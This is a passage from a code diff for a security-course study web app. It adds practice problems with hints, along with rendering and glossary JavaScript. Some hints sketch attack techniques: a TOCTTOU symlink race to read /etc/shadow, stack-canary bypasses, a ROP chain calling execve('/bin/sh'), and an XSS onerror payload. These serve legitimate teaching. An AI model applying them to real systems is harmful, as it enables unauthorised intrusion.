+  {tag:'design',text:"Apply Saltzer & Schroeder's principles to a smart lock. Pick three principles that are in tension (e.g., complete mediation vs. fail-safe defaults vs. usability) and pick one to violate intentionally — justify the tradeoff.",hint:'If the network dies, does the lock fail-open (safety) or fail-closed (security)? Different answers for nuclear plants vs. fire exits.'},
+  {tag:'debug',text:'A login form runs an expensive bcrypt hash only when the username exists in the DB. Why is this a vulnerability even though it never leaks the password?',hint:'Timing side-channel: response latency tells the attacker which usernames are valid (account enumeration).'},
+  {tag:'derive',star:true,text:'TOCTTOU: a setuid program calls access("/tmp/file", R_OK) then open("/tmp/file"). Show the exact race where an unprivileged attacker reads /etc/shadow. How does openat(2) + O_NOFOLLOW fix it?',hint:'Between access() and open(), unlink the file and symlink to /etc/shadow. The kernel re-resolves the path the second time.'}
+]},
+{week:'Memory Safety',title:'Buffer Overflows, ROP & Mitigations',hook:"Every memory-safety mitigation since 1996 is a workaround for one decision: choosing C. Each new defense buys ~5 years before the next bypass.",items:[
+  {tag:'debug',star:true,text:'A C function has a 64-byte stack buffer and calls gets() into it. Stack canary is enabled. Why is gets() still exploitable in practice? Name two ways to bypass the canary.',hint:'(1) Leak the canary via a separate read primitive (format string, info disclosure). (2) Brute-force one byte at a time on a forking server where the canary is the same across forks.'},
+  {tag:'design',star:true,text:"You're building a ROP chain on x86-64 to call execve('/bin/sh',0,0). ASLR is enabled but you have one libc leak. List the four gadgets you need and explain why ROP is necessary at all (instead of just jumping to system()).",hint:"x86-64 passes args in registers (rdi, rsi, rdx), so you need pop-rdi, pop-rsi, pop-rdx gadgets plus the address of execve. 'system()' alone only fixes rdi."},
+  {tag:'derive',text:'ASLR randomizes the base address of code + stack + heap. On 32-bit x86 only ~20 bits of entropy are practical. Compute the expected number of trials to find a gadget if the attacker can repeatedly fork-and-crash the server.',hint:'~2^20 ≈ 1M tries on average; achievable in minutes on a forking server. This is why ASLR alone is insufficient.'},
+  {tag:'code',text:"Compile `void f(char *s){char b[16]; strcpy(b,s);}` with `gcc -fno-stack-protector -z execstack -no-pie -m32`. In gdb, find the offset to the saved EIP. (You don't need to write the exploit — just locate the corruption point.)",hint:'Run with cyclic pattern from pwntools: cyclic(100). When it crashes, eip holds a 4-byte pattern; cyclic_find() gives the offset.'}
+]},
+{week:'Cryptography',title:'Symmetric, Hashes, MACs & PKI',hook:"Crypto rarely fails because the math is broken — it fails because someone reused an IV, hashed without a salt, or trusted a CA that shouldn't exist.",items:[
+  {tag:'debug',star:true,text:'Alice encrypts the same message M twice with AES-CBC using the same key but two different random IVs. What does an attacker learn? Now: she reuses the same IV. What leaks?',hint:'Different IVs: nothing (that\u2019s the point). Same IV in CBC leaks whether the first block of M1 equals the first block of M2; with CTR, IV reuse XORs the keystream away and recovers M1⊕M2.'},
+  {tag:'design',text:'Build a password-reset flow. What is stored server-side? What does the reset email actually contain? How long is the token valid? Draw the threat model — what if the email account is compromised? what if the DB leaks?',hint:'Store H(token) not token. Single-use, ~15 min expiry, invalidate on use AND on password change. Send the secret part only in the email, never in the URL path that hits server logs.'},
+  {tag:'derive',text:'RSA: given n=pq and φ=(p−1)(q−1), prove m^(ed) ≡ m (mod n) when ed ≡ 1 (mod φ). Use Fermat–Euler + CRT.',hint:'ed = 1+kφ. By Fermat-Euler m^φ ≡ 1 (mod p) when gcd(m,p)=1; do it mod p and mod q separately, then CRT-combine. Handle gcd(m,p)≠0 as the easy edge case.'},
+  {tag:'design',star:true,text:"You're issuing certificates for an internal service mesh (1000 microservices, 6-month rotation). Compare three designs: (a) one CA signs everything, (b) per-team intermediate CAs, (c) SPIFFE/SVID short-lived (1 hr) certs. Where are the keys? What\u2019s the blast radius of a CA compromise?",hint:'Short-lived certs reduce blast radius from \"forever\" to \"one hour\" — but require a robust automated PKI. CA-key compromise in (a) means re-bootstrapping all 1000 services.'}
+]},
+{week:'Web Security',title:'XSS, CSRF, SQLi, Auth & Sessions',hook:"Social engineering and bad defaults beat clever bugs. Most web pwns are still missing escapes, missing CSRF tokens, and cookies without SameSite.",items:[
+  {tag:'debug',star:true,text:"A site escapes `<` and `>` but not quotes. The user-supplied value lands inside `<img src=USER>` (unquoted). Find an XSS payload using only unquoted-attribute context — no `<`, no `>`.",hint:'`x onerror=alert(1)` — the space ends the src attribute; onerror runs when the image fails.'},
+  {tag:'design',text:'Design a rate-limit defense against credential stuffing. What is the counter key (username? IP? both?)? What is the response on hit — reject, delay, drop, or CAPTCHA? Where do you leak info if you do the wrong one?',hint:"Keying on username DoSes valid users; keying on IP fails against botnets. Hybrid: per-(user,IP-prefix) with exponential backoff. 'Reject' leaks username existence; 'delay' is invisible to attackers."},
+  {tag:'derive',star:true,text:"Why does TLS 1.3 drop RSA key-exchange in favor of (EC)DHE-only? State the property that 'forward secrecy' guarantees, and the exact attack scenario RSA-KE loses against.",hint:'Record TLS traffic today; compel/steal the server\u2019s RSA private key in 5 years; decrypt every old session. (EC)DHE deletes the ephemeral key after the handshake — no key, no decryption.'},
+  {tag:'design',text:"A SPA stores its session token in `localStorage`. The security team wants to switch to `HttpOnly` cookies. List three concrete attacks this prevents — and two new problems it introduces (CSRF, third-party context).",hint:'Prevents: XSS-stealing the token, supply-chain JS exfil, browser extension reads. Introduces: CSRF (need SameSite + tokens), iframe/cross-site contexts where cookies don\u2019t flow.'}
+]},
+{week:'Network Security',title:'TLS, DNS, TCP, ARP, Firewalls & DoS',hook:"The network is a side channel by default — timing, sizes, SNI, and DNS leak who you talk to even when payloads are encrypted. Zero-trust flips the mindset: the network is the adversary, not the perimeter.",items:[
+  {tag:'debug',star:true,text:"You sniff a TLS 1.3 connection on coffee-shop wifi. You can\u2019t read the data — but list five pieces of information you still learn about the user. Now: which does Encrypted ClientHello (ECH) hide?",hint:'SNI (which site), IP, packet sizes/timing (fingerprint pages), DNS queries (unless DoH/DoT), TLS handshake metadata. ECH hides SNI; DNS still leaks unless encrypted separately.'},
+  {tag:'derive',text:'A Kaminsky-style DNS cache-poisoning attack races the legitimate resolver. With a 16-bit transaction ID and one source port, compute the expected queries needed. Now repeat with source-port randomization (16 bits). Why does this turn minutes into years?',hint:'Birthday: ~2^15 vs ~2^31 queries. The product of two random fields kills brute force — but only because every query is independent.'},
+  {tag:'design',text:'Design a SYN-flood defense for an internet-facing service. Compare SYN cookies, connection-rate limits, and an in-front L4 LB. What does each cost in legitimate-user latency? Which one breaks TCP window-scaling negotiation?',hint:'SYN cookies are stateless but lose negotiated TCP options (window scale, SACK, timestamps). LB absorbs state but adds a hop. Rate limits drop legit users behind shared NAT.'},
+  {tag:'design',star:true,text:'Apply zero-trust to a corporate VPN replacement. Every internal service today trusts \"on-network\" requests. List five things you must add per-service (auth, posture, audit, encryption, segmentation) and what breaks first when you remove the VPN.',hint:'Each service must do mutual-TLS or signed JWT, device-posture check, per-request audit, end-to-end encryption, and identity-based ACLs (not IP). What breaks first: legacy admin tools that bind to 127.0.0.1 assuming \"local = trusted.\"'}
+]}
+];
 // ═══════════════════════════════════════════════════════════════════════
 // PRACTICE PROBLEMS (Problem-First learning)
 // ═══════════════════════════════════════════════════════════════════════
+const PROB_STATE_KEY = STORAGE_KEY + '-probstate';
+function probLoadState() { try { return JSON.parse(localStorage.getItem(PROB_STATE_KEY) || '{}'); } catch(e) { return {}; } }
+function probSaveState(s) { try { localStorage.setItem(PROB_STATE_KEY, JSON.stringify(s)); } catch(e) {} }
+let _probState = probLoadState();
+let _probFilters = { tags: new Set(), search: '', status: 'all' };
+let _probFlat = []; // [{si, ii, p}]
+
 function renderProblems() {
   const container = document.getElementById('problems-container');
   if (!container || container.dataset.rendered) return;
@@ -2383,6 +3430,17 @@ function renderProblems() {
              : (C.problems && C.problems.length) ? C.problems : null;
   if (!data) { container.innerHTML = '<div class="prob-intro">No practice problems defined yet for this course.</div>'; container.dataset.rendered = '1'; return; }
   container.dataset.rendered = '1';
+
+  // Build flat index + per-tag counts
+  _probFlat = [];
+  const tagCounts = {};
+  data.forEach((sec, si) => (sec.items||[]).forEach((p, ii) => {
+    _probFlat.push({ si, ii, p, key: si+':'+ii });
+    const t = p.tag || 'design';
+    tagCounts[t] = (tagCounts[t]||0) + 1;
+  }));
+  const TAGS = ['design','derive','debug','code','paper'];
+
   let html = `<div class="prob-intro">
     <strong>🧠 Problem-First Learning.</strong> Try each problem for 10 minutes <em>before</em> watching the lecture — flail, sketch, be wrong. Then watch with specific questions in mind. Your attention spikes 3–5×.
     <br><br>
@@ -2392,24 +3450,653 @@ function renderProblems() {
     <span class="prob-tag debug">debug</span> find the failure mode &nbsp;
     <span class="prob-tag code">code</span> hands-on &nbsp;
     <span class="prob-tag paper">paper</span> predict before reading
-  </div>`;
-  data.forEach((sec, i) => {
-    html += `<details class="prob-section"${i < 2 ? ' open' : ''}>
-      <summary><span class="wk">${sec.week||''}</span> ${sec.title||''}</summary>
-      <div class="prob-body"><ol>`;
-    (sec.items||[]).forEach(p => {
-      html += `<li><span class="prob-tag ${p.tag||'design'}">${p.tag||'design'}</span>${p.text||''}`;
-      if (p.hint) html += `<span class="prob-hint">${p.hint}</span>`;
-      html += `</li>`;
+    <br><br>
+    <strong style="color:#ffa657">⭐ starred</strong> problems are curiosity-piquing — start there if you're new.
+    Reveals come in three layers: <strong style="color:#d2a8ff">💡 hint</strong> (nudge) · <strong style="color:#79c0ff">🔑 approach</strong> (how to attack) · <strong style="color:#7ee787">📐 answer</strong> (the result). Try the problem before peeking.
+  </div>
+  <div class="prob-toolbar">
+    <input id="prob-search" class="prob-search" type="text" placeholder="🔍 Search problems by keyword…" />
+    <div class="prob-filter-row" id="prob-tag-row">
+      ${TAGS.map(t => `<span class="prob-chip ${t}" data-tag="${t}">${t}<span class="count">${tagCounts[t]||0}</span></span>`).join('')}
+    </div>
+    <div class="prob-filter-row" id="prob-status-row">
+      <span class="prob-chip" data-status="all">All</span>
+      <span class="prob-chip" data-status="unattempted">○ New</span>
+      <span class="prob-chip" data-status="thinking">🤔 Thinking</span>
+      <span class="prob-chip" data-status="got">💡 Got it</span>
+      <span class="prob-chip" data-status="stuck">❓ Stuck</span>
+    </div>
+    <button id="prob-surprise" class="prob-actbtn primary" title="Open a random problem">🎲 Surprise me</button>
+    <button id="prob-reset" class="prob-actbtn" title="Clear all status">↺ Reset</button>
+    <div class="prob-progress" title="Problems attempted (thinking / got / stuck)">
+      <span id="prob-progress-text">0/${_probFlat.length}</span>
+      <div class="prob-progress-bar"><div id="prob-progress-fill" class="prob-progress-fill" style="width:0%"></div></div>
+    </div>
+  </div>
+  <div id="prob-sections">`;
+
+  data.forEach((sec, si) => {
+    const secTotal = (sec.items||[]).length;
+    html += `<details class="prob-section" data-si="${si}"${si < 2 ? ' open' : ''}>
+      <summary><span class="wk">${sec.week||''}</span> <span class="sec-title">${sec.title||''}</span>
+        <span class="sec-meta"><span class="done-count" data-sec-done="${si}">0</span>/<span>${secTotal}</span></span>
+      </summary>`;
+    if (sec.hook) html += `<div class="prob-hook">${sec.hook}</div>`;
+    html += `<div class="prob-body">`;
+    (sec.items||[]).forEach((p, ii) => {
+      const key = si+':'+ii;
+      const st = _probState[key] || {};
+      const tag = p.tag || 'design';
+      const statusCls = st.status ? ' status-'+st.status : '';
+      html += `<div class="prob-card${statusCls}" data-key="${key}" data-tag="${tag}" data-status="${st.status||''}">
+        <div class="pc-head">
+          <span class="pc-num">${(ii+1).toString().padStart(2,'0')}</span>
+          <span class="prob-tag ${tag}">${tag}</span>
+          ${p.star ? '<span class="pc-star" title="Curiosity pick">★</span>' : ''}
+          <div class="prob-status-btns">
+            <button class="prob-statbtn thinking${st.status==='thinking'?' active':''}" data-status="thinking" title="I'm working on this">🤔</button>
+            <button class="prob-statbtn got${st.status==='got'?' active':''}"           data-status="got"      title="Got it">💡</button>
+            <button class="prob-statbtn stuck${st.status==='stuck'?' active':''}"       data-status="stuck"    title="Stuck">❓</button>
+          </div>
+        </div>
+        <div class="pc-text">${p.text||''}</div>`;
+      const reveals = [];
+      if (p.hint)     reveals.push({ kind:'hint',     label:'💡 Reveal hint',   field:'hint',     btnCls:'',          panelCls:'prob-hint',     tag:'Hint' });
+      if (p.approach) reveals.push({ kind:'approach', label:'🔑 Show approach', field:'approach', btnCls:'approach',  panelCls:'prob-approach', tag:'Approach' });
+      if (p.answer)   reveals.push({ kind:'answer',   label:'📐 Show answer',   field:'answer',   btnCls:'answer',    panelCls:'prob-answer',   tag:'Answer' });
+      if (reveals.length) {
+        html += `<div class="pc-actions">`;
+        reveals.forEach(r => {
+          const shown = st[r.kind+'Shown'];
+          html += `<button class="prob-revealbtn ${r.btnCls}" data-action="${r.kind}" ${shown?'style="display:none"':''}>${r.label}</button>`;
+        });
+        html += `</div>`;
+        reveals.forEach(r => {
+          const shown = st[r.kind+'Shown'];
+          html += `<div class="prob-reveal-panel ${r.panelCls}${shown?' shown':''}" data-panel="${r.kind}"><span class="rh-label">${r.tag}</span>${p[r.field]}</div>`;
+        });
+      }
+      html += `</div>`;
     });
-    html += `</ol></div></details>`;
+    html += `</div></details>`;
   });
+  html += `</div>
+  <div class="prob-spotlight" id="prob-spotlight">
+    <div class="prob-spotlight-card">
+      <button class="sl-close" onclick="probCloseSpotlight()">×</button>
+      <h3>🎲 Surprise Problem</h3>
+      <div id="prob-spotlight-body"></div>
+    </div>
+  </div>`;
+
   container.innerHTML = html;
+
+  // Wire interactions
+  container.querySelectorAll('#prob-tag-row .prob-chip').forEach(c => c.addEventListener('click', () => {
+    const tag = c.dataset.tag;
+    if (_probFilters.tags.has(tag)) _probFilters.tags.delete(tag); else _probFilters.tags.add(tag);
+    c.classList.toggle('active');
+    probApplyFilters();
+  }));
+  container.querySelectorAll('#prob-status-row .prob-chip').forEach(c => c.addEventListener('click', () => {
+    container.querySelectorAll('#prob-status-row .prob-chip').forEach(x => x.classList.remove('active'));
+    c.classList.add('active');
+    _probFilters.status = c.dataset.status;
+    probApplyFilters();
+  }));
+  container.querySelector('#prob-status-row .prob-chip[data-status="all"]').classList.add('active');
+
+  const searchEl = container.querySelector('#prob-search');
+  searchEl.addEventListener('input', () => { _probFilters.search = searchEl.value.toLowerCase().trim(); probApplyFilters(); });
+
+  container.querySelector('#prob-surprise').addEventListener('click', probSurpriseMe);
+  container.querySelector('#prob-reset').addEventListener('click', () => {
+    if (!confirm('Clear status on all '+_probFlat.length+' problems?')) return;
+    _probState = {}; probSaveState(_probState);
+    container.dataset.rendered = ''; container.innerHTML = ''; renderProblems();
+  });
+
+  container.querySelectorAll('.prob-card').forEach(card => {
+    card.querySelectorAll('.prob-statbtn').forEach(btn => btn.addEventListener('click', e => {
+      e.stopPropagation();
+      const key = card.dataset.key;
+      const newStatus = btn.dataset.status;
+      const st = _probState[key] || {};
+      st.status = (st.status === newStatus) ? null : newStatus;
+      _probState[key] = st; probSaveState(_probState);
+      card.classList.remove('status-thinking','status-got','status-stuck');
+      if (st.status) card.classList.add('status-'+st.status);
+      card.dataset.status = st.status || '';
+      card.querySelectorAll('.prob-statbtn').forEach(b => b.classList.toggle('active', b.dataset.status === st.status));
+      probUpdateProgress();
+      if (_probFilters.status !== 'all') probApplyFilters();
+    }));
+    const revealBtns = card.querySelectorAll('[data-action="hint"],[data-action="approach"],[data-action="answer"]');
+    revealBtns.forEach(btn => btn.addEventListener('click', () => {
+      const kind = btn.dataset.action;
+      const panel = card.querySelector(`.prob-reveal-panel[data-panel="${kind}"]`);
+      if (panel) panel.classList.add('shown');
+      btn.style.display = 'none';
+      const key = card.dataset.key;
+      const st = _probState[key] || {};
+      st[kind+'Shown'] = true; _probState[key] = st; probSaveState(_probState);
+    }));
+  });
+
+  probUpdateProgress();
 }
+
+function probApplyFilters() {
+  const container = document.getElementById('problems-container');
+  const { tags, search, status } = _probFilters;
+  container.querySelectorAll('.prob-card').forEach(card => {
+    const tag = card.dataset.tag;
+    const cardStatus = card.dataset.status || '';
+    const text = card.querySelector('.pc-text').textContent.toLowerCase();
+    let show = true;
+    if (tags.size > 0 && !tags.has(tag)) show = false;
+    if (search && !text.includes(search)) show = false;
+    if (status !== 'all') {
+      if (status === 'unattempted') { if (cardStatus) show = false; }
+      else if (cardStatus !== status) show = false;
+    }
+    card.classList.toggle('hidden', !show);
+  });
+  // Auto-open sections with visible cards; hide empty sections
+  container.querySelectorAll('.prob-section').forEach(sec => {
+    const visible = sec.querySelectorAll('.prob-card:not(.hidden)').length;
+    sec.style.display = visible === 0 ? 'none' : '';
+    if (visible > 0 && (tags.size || search || status !== 'all')) sec.open = true;
+  });
+}
+
+function probUpdateProgress() {
+  const total = _probFlat.length;
+  let attempted = 0;
+  const perSec = {};
+  _probFlat.forEach(({si, key}) => {
+    const st = _probState[key];
+    if (st && st.status) { attempted++; perSec[si] = (perSec[si]||0) + 1; }
+  });
+  const txt = document.getElementById('prob-progress-text');
+  const fill = document.getElementById('prob-progress-fill');
+  if (txt) txt.textContent = attempted + '/' + total;
+  if (fill) fill.style.width = (total ? (attempted/total*100) : 0) + '%';
+  document.querySelectorAll('[data-sec-done]').forEach(el => {
+    const si = +el.dataset.secDone;
+    el.textContent = perSec[si] || 0;
+  });
+}
+
+function probSurpriseMe() {
+  if (!_probFlat.length) return;
+  // Prefer starred & unattempted; otherwise unattempted; otherwise any
+  const starredNew = _probFlat.filter(x => x.p.star && !(_probState[x.key]||{}).status);
+  const anyNew     = _probFlat.filter(x => !(_probState[x.key]||{}).status);
+  const pool = starredNew.length ? starredNew : (anyNew.length ? anyNew : _probFlat);
+  const pick = pool[Math.floor(Math.random()*pool.length)];
+  const { p, si, ii, key } = pick;
+  const sec = (window.PROBLEMS_DATA || (C.problems||[]))[si];
+  const tag = p.tag || 'design';
+  const body = document.getElementById('prob-spotlight-body');
+  body.innerHTML = `
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:6px;flex-wrap:wrap">
+      <span class="prob-tag ${tag}">${tag}</span>
+      ${p.star ? '<span style="color:#ffa657">★</span>' : ''}
+      <span style="color:#8b949e;font-size:12px">${sec.week||''} · ${sec.title||''} · #${ii+1}</span>
+    </div>
+    <div class="pc-text">${p.text||''}</div>
+    ${(()=>{const L=[];if(p.hint)L.push({s:'💡 Reveal hint',c:'prob-hint',t:'Hint',b:p.hint});if(p.approach)L.push({s:'🔑 Show approach',c:'prob-approach',t:'Approach',b:p.approach});if(p.answer)L.push({s:'📐 Show answer',c:'prob-answer',t:'Answer',b:p.answer});return L.map(l=>`<details style="margin-top:10px"><summary style="cursor:pointer;color:#8b949e;font-size:12px;padding:4px 0">${l.s}</summary><div class="prob-reveal-panel ${l.c} shown" style="margin-top:6px"><span class="rh-label">${l.t}</span>${l.b}</div></details>`).join('');})()}
+    <div style="margin-top:14px;display:flex;gap:6px;flex-wrap:wrap">
+      <button class="prob-actbtn" onclick="probJumpTo('${key}')">↗ Jump to it</button>
+      <button class="prob-actbtn" onclick="probSurpriseMe()">🎲 Another</button>
+    </div>`;
+  document.getElementById('prob-spotlight').classList.add('open');
+}
+function probCloseSpotlight() { const el = document.getElementById('prob-spotlight'); if (el) el.classList.remove('open'); }
+function probJumpTo(key) {
+  probCloseSpotlight();
+  const card = document.querySelector(`.prob-card[data-key="${key}"]`);
+  if (!card) return;
+  const sec = card.closest('.prob-section');
+  if (sec) sec.open = true;
+  card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  card.style.transition = 'box-shadow .3s'; card.style.boxShadow = '0 0 0 2px #58a6ff';
+  setTimeout(() => { card.style.boxShadow = ''; }, 1500);
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') probCloseSpotlight(); });
 if (typeof switchTab === 'function') {
   const _origSwitchTab_prob = switchTab;
   switchTab = function(tab) { _origSwitchTab_prob(tab); if (tab === 'problems') renderProblems(); };
 }
+
+// === BEGIN glossary v1 js ===
+// ═══════════════════════════════════════════════════════════════════════
+// GLOSSARY — definitions + cross-references with graph & mindmap
+// ═══════════════════════════════════════════════════════════════════════
+(function initGlossaryMaps() {
+  const gloss = (C && C.glossary) || [];
+  if (!gloss.length) return;
+
+  // 1. Build id → entry maps and "label/aka" → id reverse map.
+  const byId = {};
+  const byLabel = {}; // lowercased term/aka → id
+  gloss.forEach(g => {
+    byId[g.id] = g;
+    const keys = [g.term].concat(g.aka || []);
+    keys.forEach(k => { if (k) byLabel[k.toLowerCase().trim()] = g.id; });
+  });
+
+  // 2. Patch graph node tips for any node whose id matches a glossary entry.
+  let graphMatched = 0;
+  const glossByGraphNode = {};
+  if (C.graph && Array.isArray(C.graph.nodes)) {
+    C.graph.nodes.forEach(n => {
+      if (byId[n.id]) {
+        glossByGraphNode[n.id] = n.id;
+        graphMatched++;
+        if (n.tip && n.tip.indexOf('📖') < 0) n.tip = n.tip + ' · 📖 in glossary';
+      } else {
+        // Fallback: try label/aka match
+        const k = (n.label || '').toLowerCase().trim();
+        if (byLabel[k]) {
+          glossByGraphNode[n.id] = byLabel[k];
+          graphMatched++;
+          if (n.tip && n.tip.indexOf('📖') < 0) n.tip = n.tip + ' · 📖 in glossary';
+        }
+      }
+    });
+  }
+
+  // 3. Walk mindmap and build name → glossary-id map. Match relaxed:
+  //    full name (newlines → space) OR each line.
+  let mindmapMatched = 0;
+  const glossByMindmapName = {};
+  function walkMm(node) {
+    if (!node) return;
+    if (node.name) {
+      const full = node.name.replace(/\n/g, ' ').trim();
+      const candidates = [full].concat(node.name.split(/\n+/).map(s => s.trim()).filter(Boolean));
+      for (const c of candidates) {
+        const id = byLabel[c.toLowerCase()];
+        if (id) {
+          glossByMindmapName[full] = id;
+          mindmapMatched++;
+          break;
+        }
+      }
+    }
+    (node.children || []).forEach(walkMm);
+  }
+  if (C.mindmap) walkMm(C.mindmap);
+
+  window._glossaryById = byId;
+  window._glossaryByLabel = byLabel;
+  window._glossaryIdByGraphNode = glossByGraphNode;
+  window._glossaryIdByMindmapName = glossByMindmapName;
+  window._glossaryStats = { graphMatched: graphMatched, mindmapMatched: mindmapMatched };
+
+  // 4. Monkey-patch showTooltip so it appends a "📖 Defined in glossary →" link
+  //    whenever the hovered name corresponds to a glossary entry.
+  if (typeof window.showTooltip === 'function') {
+    const _origShowTooltip = window.showTooltip;
+    const ttRoot = document.getElementById('tooltip');
+    let glossFooter = ttRoot.querySelector('.tt-glossary');
+    if (!glossFooter) {
+      glossFooter = document.createElement('div');
+      glossFooter.className = 'tt-glossary';
+      ttRoot.appendChild(glossFooter);
+    }
+    window.showTooltip = function(evt, name, tip, slides) {
+      _origShowTooltip(evt, name, tip, slides);
+      glossFooter.innerHTML = '';
+      ttRoot.classList.remove('has-glossary');
+      if (!name) return;
+      const plain = String(name).replace(/\n/g, ' ').trim();
+      const key = plain.toLowerCase();
+      let id = byLabel[key] || glossByMindmapName[plain] || null;
+      if (!id) {
+        // strip parenthetical suffix e.g. "Optical Switch (OCS)" → "Optical Switch"
+        const stripped = plain.replace(/\s*\([^)]*\)\s*$/, '').toLowerCase();
+        if (stripped !== key) id = byLabel[stripped] || null;
+      }
+      if (id) {
+        const a = document.createElement('a');
+        a.textContent = '📖 Defined in glossary →';
+        a.onclick = (e) => {
+          e.stopPropagation();
+          if (typeof window.glossaryJumpToTerm === 'function') window.glossaryJumpToTerm(id);
+        };
+        glossFooter.appendChild(a);
+        ttRoot.classList.add('has-glossary');
+      }
+    };
+  }
+})();
+
+// ─── renderGlossary ───────────────────────────────────────────────────
+let _glossSelectedCat = 'all';
+let _glossSearch = '';
+let _glossSearchTimer = null;
+let _glossBuilt = false;
+
+const GLOSS_CAT_COLORS = {
+  hardware:    '#58a6ff',
+  software:    '#7ee787',
+  numerics:    '#79c0ff',
+  systems:     '#d2a8ff',
+  performance: '#f778ba',
+  concepts:    '#ffa657'
+};
+
+function renderGlossary() {
+  const data = (C.glossary || []).slice().sort((a, b) =>
+    a.term.toLowerCase().localeCompare(b.term.toLowerCase()));
+  const list = document.getElementById('glossary-list');
+  const pillBar = document.getElementById('glossary-cat-pills');
+  const countEl = document.getElementById('glossary-count');
+  const searchEl = document.getElementById('glossary-search');
+  if (!list || !pillBar || !countEl || !searchEl) return;
+
+  // Build category pills + search input wiring once.
+  if (!_glossBuilt) {
+    const cats = ['all'].concat(
+      Array.from(new Set(data.map(d => d.category))).sort());
+    pillBar.innerHTML = '';
+    cats.forEach(cat => {
+      const btn = document.createElement('button');
+      btn.textContent = cat === 'all' ? `All (${data.length})` :
+        `${cat} (${data.filter(d => d.category === cat).length})`;
+      btn.dataset.cat = cat;
+      const color = cat === 'all' ? '#58a6ff' : (GLOSS_CAT_COLORS[cat] || '#58a6ff');
+      btn.style.setProperty('--pill-color', color);
+      btn.style.setProperty('--pill-bg', color + '22');
+      if (cat === _glossSelectedCat) btn.classList.add('active');
+      btn.onclick = () => {
+        _glossSelectedCat = cat;
+        pillBar.querySelectorAll('button').forEach(b =>
+          b.classList.toggle('active', b.dataset.cat === cat));
+        renderGlossary();
+      };
+      pillBar.appendChild(btn);
+    });
+    searchEl.addEventListener('input', () => {
+      if (_glossSearchTimer) clearTimeout(_glossSearchTimer);
+      _glossSearchTimer = setTimeout(() => {
+        _glossSearch = searchEl.value.trim().toLowerCase();
+        renderGlossary();
+      }, 120);
+    });
+    _glossBuilt = true;
+  }
+
+  // Filter
+  const q = _glossSearch;
+  const visible = data.filter(d => {
+    if (_glossSelectedCat !== 'all' && d.category !== _glossSelectedCat) return false;
+    if (!q) return true;
+    const hay = [d.term, (Array.isArray(d.aka) ? d.aka.join(' ') : (d.aka || '')), d.short, d.long || ''].join(' ').toLowerCase();
+    return hay.indexOf(q) >= 0;
+  });
+
+  countEl.textContent = `${visible.length} of ${data.length} terms`;
+
+  const graphIds = new Set();
+  if (C.graph && C.graph.nodes) C.graph.nodes.forEach(n => graphIds.add(n.id));
+  const glossIds = new Set(data.map(d => d.id));
+  const mindmapNames = window._glossaryIdByMindmapName || {};
+  const reverseMindmap = {}; // glossary-id → mindmap label
+  Object.keys(mindmapNames).forEach(name => { reverseMindmap[mindmapNames[name]] = name; });
+
+  list.innerHTML = '';
+  visible.forEach(d => {
+    const color = GLOSS_CAT_COLORS[d.category] || '#58a6ff';
+    const card = document.createElement('div');
+    card.className = 'glossary-card';
+    card.dataset.id = d.id;
+    card.style.setProperty('--cat-color', color);
+
+    const head = document.createElement('div');
+    head.className = 'glossary-term-row';
+    const term = document.createElement('span');
+    term.className = 'glossary-term';
+    term.textContent = d.term;
+    head.appendChild(term);
+    const badge = document.createElement('span');
+    badge.className = 'glossary-cat-badge';
+    badge.textContent = d.category;
+    badge.style.setProperty('--cat-color', color);
+    head.appendChild(badge);
+    card.appendChild(head);
+
+    if (d.aka && d.aka.length) {
+      const aka = document.createElement('div');
+      aka.className = 'glossary-aka';
+      aka.textContent = 'aka ' + (Array.isArray(d.aka) ? d.aka.join(', ') : d.aka);
+      card.appendChild(aka);
+    }
+
+    const shortEl = document.createElement('div');
+    shortEl.className = 'glossary-short';
+    shortEl.textContent = d.short || '';
+    card.appendChild(shortEl);
+
+    if (d.long) {
+      const longEl = document.createElement('div');
+      longEl.className = 'glossary-long';
+      longEl.innerHTML = d.long;
+      card.appendChild(longEl);
+      const toggle = document.createElement('button');
+      toggle.className = 'glossary-toggle';
+      toggle.textContent = 'Show more ▾';
+      toggle.onclick = () => {
+        const expanded = card.classList.toggle('expanded');
+        toggle.textContent = expanded ? 'Show less ▴' : 'Show more ▾';
+      };
+      card.appendChild(toggle);
+    }
+
+    const links = document.createElement('div');
+    links.className = 'glossary-links';
+    if (graphIds.has(d.id)) {
+      const b = document.createElement('button');
+      b.textContent = '🔗 Topic Graph';
+      b.onclick = () => window.glossaryJumpToGraphNode(d.id);
+      links.appendChild(b);
+    }
+    if (reverseMindmap[d.id]) {
+      const b = document.createElement('button');
+      b.textContent = '📐 Mind Map';
+      b.onclick = () => window.glossaryJumpToMindmapNode(reverseMindmap[d.id]);
+      links.appendChild(b);
+    }
+    (d.seeAlso || []).forEach(otherId => {
+      if (!glossIds.has(otherId)) return;
+      const other = (C.glossary || []).find(x => x.id === otherId);
+      if (!other) return;
+      const b = document.createElement('button');
+      b.textContent = '→ ' + other.term;
+      b.onclick = () => window.glossaryJumpToTerm(otherId);
+      links.appendChild(b);
+    });
+    if (links.children.length) card.appendChild(links);
+
+    list.appendChild(card);
+  });
+}
+
+// ─── Cross-tab jump helpers ───────────────────────────────────────────
+window.glossaryJumpToTerm = function(id) {
+  if (typeof switchTab === 'function') switchTab('glossary');
+  setTimeout(() => {
+    const card = document.querySelector('.glossary-card[data-id="' + CSS.escape(id) + '"]');
+    if (!card) return;
+    card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    card.classList.remove('flash');
+    void card.offsetWidth; // restart animation
+    card.classList.add('flash');
+    // Pull the display term from the card itself so the toast matches what the user sees
+    const labelEl = card.querySelector('.glossary-term');
+    const label = labelEl ? labelEl.textContent.trim() : id;
+    if (typeof showGlossaryToast === 'function') showGlossaryToast('Glossary', label, 'glossary');
+    setTimeout(() => card.classList.remove('flash'), 2800);
+  }, 60);
+};
+
+window.glossaryJumpToGraphNode = function(id) {
+  if (typeof switchTab === 'function') switchTab('graph');
+  const tryFlash = (attempt) => {
+    const g = document.querySelector('g.graph-node[data-id="' + CSS.escape(id) + '"]');
+    if (!g) {
+      if (attempt < 12) return setTimeout(() => tryFlash(attempt + 1), 120);
+      return;
+    }
+    // Pull the node's force-simulation position from its bound datum
+    let d = null;
+    try { d = (typeof d3 !== 'undefined') ? d3.select(g).datum() : null; } catch(_) {}
+    const label = (d && (d.label || d.id)) || id;
+
+    // 1) Pan + zoom the SVG so the node is centered and reasonably zoomed in
+    try {
+      if (d && typeof d.x === 'number' && typeof d.y === 'number' && typeof d3 !== 'undefined' && typeof graphZoom !== 'undefined') {
